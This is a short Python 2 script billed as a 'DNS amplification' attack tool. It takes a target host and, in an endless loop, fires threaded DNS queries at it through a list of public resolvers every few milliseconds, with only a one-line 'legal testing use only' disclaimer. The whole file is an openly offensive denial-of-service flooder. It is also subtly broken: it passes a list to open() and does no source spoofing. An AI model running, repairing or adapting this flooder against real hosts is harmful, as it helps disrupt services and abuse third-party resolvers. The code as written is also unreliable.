import time, sys, threading, argparse
try:
	from dns import resolver
except:
	print "dnspython not installed"
	print "DOWNLOAD: https://github.com/rthalley/dnspython"
	sys.exit()

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--dns",help="DNS Server List",default=["4.2.2.1","4.2.2.2","4.2.2.3","4.2.2.4","4.2.2.5","4.2.2.6"])
parser.add_argument("-v", "--verbose",help="Show All Request",action="store_true")
parser.add_argument("-t", "--target",help="DNS Amplification Target")
parser.add_argument("-n", "--nohelp",help="Hides help",action="store_true")
args = parser.parse_args()

print """
 ___  _  _ ___      _   __  __ ___ 
|   \| \| / __|___ /_\ |  \/  | _ \\
| |) | .` \__ \___/ _ \| |\/| |  _/
|___/|_|\_|___/  /_/ \_\_|  |_|_|  

 Made for legal testing use only!
"""

if not args.nohelp:
	parser.print_help()
servers = args.dns
host = args.target
verbose = args.verbose
res = resolver.Resolver()
servers = open(servers).read().split("\n")
s = 0

def _amp(dns,target,name):
	try:
		res.nameservers = [dns]
		req = res.query(target)
		if verbose:
			sys.stdout.write("\r\n "+name+" -> "+target+"    ")
		else:
			sys.stdout.write("\r\r "+name+" -> "+target+"    ")
	except:
		pass

nodes = []
while 1:
	for _ in servers:
		s = s + 1
		name = _
		t = threading.Thread(target=_amp,args=(_,host,name,))
		sys.stderr = t.start()
		time.sleep(0.005)
